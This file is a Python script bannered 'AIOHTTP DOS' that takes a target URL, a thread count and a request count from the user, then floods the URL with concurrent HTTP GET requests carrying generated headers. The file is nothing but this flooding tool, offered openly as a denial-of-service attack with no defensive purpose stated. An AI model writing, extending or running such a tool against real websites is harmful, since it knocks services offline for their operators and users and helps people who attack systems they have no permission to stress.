import asyncio
import os
from datetime import datetime
from threading import Thread

import aiohttp
from colorama import Fore

from generate_headers import initHeaders
from get_proxy import get_proxy


def clear ():
    if os.name == 'nt':
        os.system ('cls')
    else:
        os.system ('clear')


def timestamp (function):
    def wrapper (*args):

        start = datetime.now ()
        function (*args)
        end = datetime.now ()

        print ('Time: ' + str (end - start))

    return wrapper


async def make_request (url: str):    
    async with aiohttp.ClientSession () as session:
        try:
            async with session.get (url, headers = initHeaders ()) as response:
                print ('%sRequest for %s%s : %sDone%s' % (Fore.BLUE, Fore.YELLOW, url, Fore.GREEN, Fore.RESET))
        except:
            print ('%sRequest for %s%s : %sError%s' % (Fore.BLUE, Fore.YELLOW, url, Fore.RED, Fore.RESET))


   
async def main (url: str, tasksCount: int):

    tasks = []
    
    for i in range (tasksCount):            
        task = asyncio.create_task (make_request (url))
        tasks.append (task)
           
    await asyncio.gather (*tasks)


@timestamp
def start (url: str,  tasksCount: int):
    asyncio.run (main (url, tasksCount))


if __name__ == '__main__':

    clear ()

    print ('''%s
Refactor: @Term_4D4N
Channel: @Termux_4D4N
%s
░█████╗░██╗░█████╗░██╗░░██╗████████╗████████╗██████╗░  ██████╗░░█████╗░░██████╗
██╔══██╗██║██╔══██╗██║░░██║╚══██╔══╝╚══██╔══╝██╔══██╗  ██╔══██╗██╔══██╗██╔════╝
███████║██║██║░░██║███████║░░░██║░░░░░░██║░░░██████╔╝  ██║░░██║██║░░██║╚█████╗░
██╔══██║██║██║░░██║██╔══██║░░░██║░░░░░░██║░░░██╔═══╝░  ██║░░██║██║░░██║░╚═══██╗
██║░░██║██║╚█████╔╝██║░░██║░░░██║░░░░░░██║░░░██║░░░░░  ██████╔╝╚█████╔╝██████╔╝
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░░░░  ╚═════╝░░╚════╝░╚═════╝░
    %s''' % (Fore.MAGENTA, Fore.GREEN, Fore.YELLOW))
    url = str (input ('URL Site(Example: https://google.com): %s' % Fore.RESET))
    threadCount = int (input ('%sFlows: %s' % (Fore.YELLOW, Fore.RESET)))
    tasksCount = int (input ('%sRequests for Flows: %s' % (Fore.YELLOW, Fore.RESET)))
    for i in range (threadCount):
        t = Thread (target = start, name = f'thread{i}', args = (url, tasksCount))
        t.start ()
